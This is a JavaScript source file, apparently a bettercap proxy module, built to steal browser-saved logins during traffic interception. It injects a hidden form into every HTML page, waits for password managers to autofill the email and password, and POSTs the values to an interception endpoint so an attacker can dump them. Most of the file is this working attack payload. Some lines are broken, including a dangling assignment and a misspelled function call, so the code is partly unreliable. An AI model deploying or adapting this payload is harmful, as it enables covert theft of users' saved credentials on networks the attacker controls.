/*
 * Ref. 
 *  - https://github.com/evilsocket/bettercap-proxy-modules/issues/72
 *  - https://freedom-to-tinker.com/2017/12/27/no-boundaries-for-user-identities-web-trackers-exploit-browser-login-managers/
 *
 * The idea:
 *
 * - On every html page, inject this invisible form who grabs credentials from login managers.
 * - POST such credentials to /login-man-abuser, given we control the HTTP traffic, well intercept this request.
 * - Intercept request, dump credentials, drop client to 404.
 */
var AbuserJavascript = 
var injectForm = function(visible) {
var container = document.createElement("div");
if (!visible){
container.style.display = "none";
}
var form = document.createElement("form");
form.attributes.autocomplete = "on";
var emailInput = document.createElement("input");
emailInput.attributes.vcard_name = "vCard.Email";
emailInput.id = "email";
emailInput.type = "email";
emailInput.name = "email";
form.appendChild(emailInput);
var passwordInput = document.createElement("input");
passwordInput.id = "password";
passwordInput.type = "password";
passwordInput.name = "password";
form.appendChild(passwordInput);
container.appendChild(form);
document.body.appendChild(container);
};

var doPOST = function(data) {
var xhr = new XMLHttpRequest();

xhr.open("POST", "/login-man-abuser");
xhr.setRequestHeader("Content-Type", "application/json");
xhr.onload = function() {
console.log("Enjoy your coffee!");
};

xhr.send(JSON.stringify(data));
};

var sniffInputField = function(fieldId){
var inputElement = document.getElementById(fieldId);
if (inputElement.value.length){
return {fieldId: inputElement.value};
}
window.setTimeout(sniffInputField, 200, fieldId);  // wait for 200ms
};

var sniffInputFields = function(){
var inputs = document.getElementsByTagName("input");
data = {};
for (var i = 0; i < inputs.length; i++) {
console.log("Will try to sniff element with id: " + inputs[i].id);
output = stringsniffInputField(inputs[i].id);
data = Object.assign({}, data, output);
}
doPOST(data);
};

var sniffFormInfo = function(visible) {
injectForm(visible);
sniffInputFields();
};

sniffFormInfo(false);;
